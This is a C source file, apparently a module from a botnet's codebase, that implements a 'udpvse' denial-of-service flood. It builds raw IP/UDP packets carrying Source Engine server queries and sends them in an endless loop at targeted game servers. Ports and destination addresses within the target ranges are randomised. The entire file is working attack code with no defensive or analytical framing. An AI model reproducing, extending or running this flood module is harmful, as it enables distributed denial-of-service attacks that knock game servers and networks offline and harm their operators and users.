#include <arpa/nameser_compat.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

#define HEADER_SIZE 5
#define CHALLENGE_SIZE 4

/**
 * Builds source engine queries, useful for CS:GO etc.
*/
static inline int build_vse_data(uint8_t *data) {
  int type = xoshiro_next() % 4;

  switch (type) {
    // A2S_INFO
    case 0:
      memcpy(data, "\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x00",
             19);
      return 19;

    // A2S_PLAYER
    case 1:
      memcpy(data, "\xFF\xFF\xFF\xFF\x55", 5);
      xoshiro_bytes(data + 5, 4);
      break;

    // A2S_RULES
    case 2:
      memcpy(data, "\xFF\xFF\xFF\xFF\x56", 5);
      xoshiro_bytes(data + 5, 4);
      break;

    // A2S_SERVERQUERY_GETCHALLENGE
    case 3:
      memcpy(data, "\xFF\xFF\xFF\xFF\x57", 5);
      break;
  }

  return HEADER_SIZE + CHALLENGE_SIZE;
}

void flood_udpvse(pflood_context_t ctx) {
  // port options
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 27015);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *ip = (struct iphdr *)packets[i];

    ip->version = IPVERSION;
    ip->ttl = IPDEFTTL;
    ip->protocol = IPPROTO_UDP;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = xoshiro_next() & 0xFFFF;
    ip->daddr = target->address;
    ip->saddr = network_local_addr();
  }

  while (true) {
    // send targets
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];

      // setup hdr shit
      struct iphdr *iph = (struct iphdr *)packets[i];
      struct udphdr *udp = (struct udphdr *)(iph + 1);
      uint8_t *data = (uint8_t *)(udp + 1);

      // generate buffer
      int buffer_size = build_vse_data(data);

      // set randomized addr and total length
      target_random_addr(target);
      iph->daddr = target->address;
      iph->id = xoshiro_next() & 0xFFFF;
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + buffer_size);

      // randomize source and port
      udp->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      udp->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
      udp->len = htons(sizeof(struct udphdr) + buffer_size);

      // calc checksum
      iph->check = 0;
      udp->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));
      udp->check = checksum_tcpudp(iph, udp, udp->len, sizeof(struct udphdr) + buffer_size);

      sendto(fd, packets[i], ntohs(iph->tot_len), 0, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));
    }

    if (psleep > 0) usleep(psleep);
  }
}
